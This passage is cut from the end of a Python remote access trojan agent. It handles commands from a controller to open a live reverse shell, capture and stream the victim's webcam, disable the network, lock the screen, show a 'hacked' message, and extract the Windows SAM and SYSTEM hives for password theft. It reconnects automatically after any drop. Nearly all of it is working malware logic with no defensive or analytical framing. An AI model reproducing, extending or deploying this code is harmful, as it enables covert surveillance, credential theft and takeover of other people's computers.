                            subprocess.run("rundll32.exe user32.dll,LockWorkStation", shell=True, creationflags=NO_WINDOW_FLAG)
                            res = "SUCCESS: Host screen locked"
                        except Exception as e:
                            res = f"FAILURE: {str(e)}"
                        client_socket.send(res.encode('utf-8'))

                    elif instruction == "RUN:SHELL":
                        execute_live_reverse_shell(client_socket)
                        continue

                    elif instruction == "RUN:OPEN_URL":
                        result = open_url_on_victim()
                        client_socket.send(result.encode('utf-8'))

                    elif instruction == "RUN:HACKED_MSG":
                        result = show_hacked_message()
                        client_socket.send(result.encode('utf-8'))

                    elif instruction == "RUN:DISABLE_NETWORK":
                        result = disable_wired_network()
                        client_socket.send(result.encode('utf-8'))

                    elif instruction == "RUN:ENABLE_NETWORK":
                        result = enable_wired_network()
                        client_socket.send(result.encode('utf-8'))

                    elif instruction == "RUN:WEBCAM":
                        result = capture_webcam()
                        client_socket.send(result.encode('utf-8'))

                    elif instruction == "RUN:STREAM_START":
                        if stream_thread is None or not stream_thread.is_alive():
                            stream_active = True
                            stream_thread = threading.Thread(target=start_webcam_stream, args=(victim_ip,), daemon=True)
                            stream_thread.start()
                            time.sleep(1)
                            res = f"SUCCESS: Webcam stream started on {victim_ip}:8080"
                        else:
                            res = "SUCCESS: Stream already running"
                        client_socket.send(res.encode('utf-8'))

                    elif instruction == "RUN:STREAM_STOP":
                        stream_active = False
                        time.sleep(1)
                        force_stop_webcam()
                        res = "SUCCESS: Stream stopped"
                        client_socket.send(res.encode('utf-8'))

                    elif instruction == "RUN:PLAY_VOICE":
                        result = play_voice()
                        client_socket.send(result.encode('utf-8'))

                    elif instruction == "RUN:PERSISTENT_NOTIFICATION":
                        result = show_persistent_notification()
                        client_socket.send(result.encode('utf-8'))

                    elif instruction == "RUN:CLOSE_NOTIFICATION":
                        result = close_notification()
                        client_socket.send(result.encode('utf-8'))

                    elif instruction == "RUN:EXTRACT_SAM":
                        result = extract_sam()
                        client_socket.send(result.encode('utf-8'))

                    elif instruction == "RUN:EXTRACT_SYSTEM":
                        result = extract_system_only()
                        client_socket.send(result.encode('utf-8'))

                    else:
                        client_socket.send(f"UNKNOWN COMMAND: {instruction}".encode('utf-8'))

            except Exception as e:
                print(f"[-] Connection failed: {e}")
                time.sleep(reconnect_delay)
                continue
            
            print("[*] Connection lost. Reconnecting in 5 seconds...")
            time.sleep(reconnect_delay)

    # ======================================================
    # CODE START
    # ======================================================
    if __name__ == "__main__":
        start_agent()

except Exception as e:
    log_error(e)
    print(f"[-] Fatal error: {e}")
    sys.exit(1)